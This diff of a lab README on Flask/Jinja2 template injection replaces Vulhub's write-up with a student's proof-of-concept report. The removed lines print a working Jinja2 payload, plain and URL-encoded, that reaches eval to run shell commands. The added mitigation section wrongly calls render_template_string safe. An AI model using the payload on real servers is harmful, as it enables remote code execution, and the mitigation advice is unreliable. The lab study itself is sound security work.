@@ -1,56 +1,88 @@
-# Flask (Jinja2) Server-Side Template Injection
+# Flask SSTI Vulnerability PoC Report
+> 화이트햇 스쿨 3기 - [21반 김태현](https://github.com/alexanderwangamja)
 
-[中文版本(Chinese version)](README.zh-cn.md)
-
-Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.
-
-References:
-
-- <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>
-- <http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates>
+## CVE Overview
+- **Name**: Server-Side Template Injection (SSTI) in Flask
+- **Type**: Server-Side Template Injection (SSTI)
+- **Affected Component**: Flask Jinja2 Template Engine
+- **Impact**: Remote Code Execution (RCE) via unsafe template evaluation
 
 ## Environment Setup
 
-Execute the following commands to build and start a Web application based on Flask 1.1.1:
+- **Vulnerable Environment**: Vulhub - Flask SSTI Module
+- **Base Image**: vulhub/flask:1.1.1
+- **Setup Steps**:
+  1. Clone the Vulhub repository.
+  2. Move to the Flask SSTI directory:
+     ```bash
+     cd vulhub/flask/ssti
+     ```
+  3. Run docker-compose:
+     ```bash
+     docker-compose up -d
+     ```
+  4. Verify that the server is running at [http://localhost:8000/](http://localhost:8000/).
 
-```
-docker compose up -d
-```
+### Screenshots
 
-After the server starts, visit `http://your-ip:8000/` to view the default page.
+- Docker container running:
 
-## Vulnerability Reproduction
+  ![docker_compose](./docker_compose.png)
 
-First, verify the SSTI vulnerability exists by visiting:
+- Flask server accessible at localhost:8000:
 
-```
-http://your-ip:8000/?name={{233*233}}
-```
+  ![flask_server](./flask_server.png)
 
-If you see the result `54289`, it confirms the presence of the SSTI vulnerability.
+- Basic SSTI exploitation (`{{7*7}}`) resulting in 49:
 
-To achieve remote code execution, you can use the following POC that obtains the `eval` function and executes arbitrary Python code:
+  ![ssti_basic](./ssti_basic.png)
 
-```python
-{% for c in [].__class__.__base__.__subclasses__() %}
-{% if c.__name__ == 'catch_warnings' %}
-  {% for b in c.__init__.__globals__.values() %}
-  {% if b.__class__ == {}.__class__ %}
-    {% if 'eval' in b.keys() %}
-      {{ b['eval']('__import__("os").popen("id").read()') }}
-    {% endif %}
-  {% endif %}
-  {% endfor %}
-{% endif %}
-{% endfor %}
-```
+## PoC (Proof of Concept)
 
-Visit the following URL (with the POC URL-encoded) to execute the command:
+- **Exploit Method**: Send a crafted template expression through user input to evaluate server-side code.
 
-```
-http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
-```
+- **Attack Payload**:
+  ```bash
+  curl.exe -G "http://localhost:8000/" --data-urlencode "name={{7*7}}"
+  ```
 
-The command execution result will be displayed:
+- **Expected Result**:
+  - The server processes the template and outputs `Hello 49`.
+  - This confirms arbitrary code execution via template injection.
 
-![](1.png)
+## Advanced PoC Using Python Script
+
+- Executed the Python script (`poc.py`) to generate an exploit URL.
+- Accessed the generated URL to trigger the server to execute the system command `id`.
+- As a result, the output `uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)` was observed.
+- This confirms that **Remote Code Execution (RCE)** is possible through server-side template injection.
+
+### Screenshot
+
+- Result of executing the exploit:
+
+  ![poc_result](./poc_result.png)
+
+## Analysis
+
+- This vulnerability occurs because user input is directly evaluated by the server without proper sanitization.
+- Attackers can execute arbitrary expressions or even system commands depending on the server configuration.
+
+## Prevention and Mitigation
+
+- **Never directly render user input in templates.**
+- **Use safe rendering functions** like `render_template_string` with explicit context separation.
+- **Update to the latest Flask and Jinja2 versions**, which have more secure defaults.
+- **Apply strict Content Security Policy (CSP)** headers to mitigate impact.
+
+## Conclusion
+
+This exercise demonstrated how a simple input field vulnerability in a Flask application could lead to server-side code execution via SSTI. To ensure secure web application development, it is critical to validate and sanitize all user inputs, especially in templating systems.
+
+---
+
+# Repository Link
+
+- TBU
+
+---
